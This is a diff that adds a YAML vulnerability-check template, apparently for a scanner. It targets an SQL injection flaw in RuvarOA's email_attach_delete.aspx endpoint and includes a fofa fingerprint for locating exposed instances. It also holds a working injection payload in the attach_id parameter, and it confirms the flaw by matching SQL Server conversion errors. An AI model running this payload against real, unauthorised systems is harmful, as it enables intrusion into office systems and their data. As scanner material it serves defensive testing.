@@ -1,0 +1,17 @@
+id: poc-yaml-ruvaroa-email-attach-delete-aspx-sqli
+info:
+  name: RuvarOA email_attach_delete.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ruvar-oa
+  fofa: body="txt_admin_key"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /LHMail/email_attach_delete.aspx?attach_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27))
+  expression: "status_code == 500 && \ncontains(body,\"在将 nvarchar 值\") &&\ncontains(body,\"\
+    转换成数据类型 int 时失败\") &&\ncontains(body,t2)\n"
+transport: http
